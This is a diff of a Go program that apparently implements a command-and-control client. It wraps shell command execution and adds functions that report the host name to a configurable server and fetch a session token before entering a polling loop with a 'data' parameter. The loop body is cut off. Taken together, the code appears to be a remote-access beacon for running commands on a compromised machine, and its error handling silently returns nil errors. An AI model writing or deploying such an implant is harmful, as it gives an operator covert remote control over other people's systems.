@@ -1,11 +1,14 @@
 package main
+
 import (
-    "io"
-    "net/http"
-    //"net/url"
-    "os/exec"
-    "strings"
-    "time"
+	"io"
+	"net/http"
+	"os"
+
+	//"net/url"
+	"os/exec"
+	"strings"
+	"time"
 )
 func runCommand(command string, args ...string) (string, error) {
     cmd := exec.Command(command, args...)
@@ -16,9 +19,37 @@ func runCommand(command string, args ...string) (string, error) {
     }
     return string(output), nil
 }
+func getHostName() (string, error){
+    hostname, err := os.Hostname()
+    if err != nil{
+        return "", nil
+    }
+    return hostname, nil
+}
+func getSession(hostname string, url string) (string, error){
+    req, err := http.NewRequest("GET", url, nil)
+    if err != nil{
+        return "", nil
+    }
+    req.Header.Set("host-name", hostname)
+    //send the request
+    client := &http.Client{}
+    resp, err := client.Do(req)
+    if err != nil{
+        return "", nil
+    }
+    defer resp.Body.Close()
+    if resp.Status == "200 OK"{
+        authorization := resp.Header.Get("Authorization")
+        return authorization, nil
+    }
+    return "", nil   
+}
 func main() {
     baseURL := "http://localhost:8000" // Change URL to server you want to connect to.
     data := ""
+    hostname, _ := getHostName()
+    Authorization, _ := getSession(hostname, baseURL)
     for {
         // Build the URL with the "data" parameter.
         //reqURL := baseURL + "/?data=" + url.QueryEscape(data)
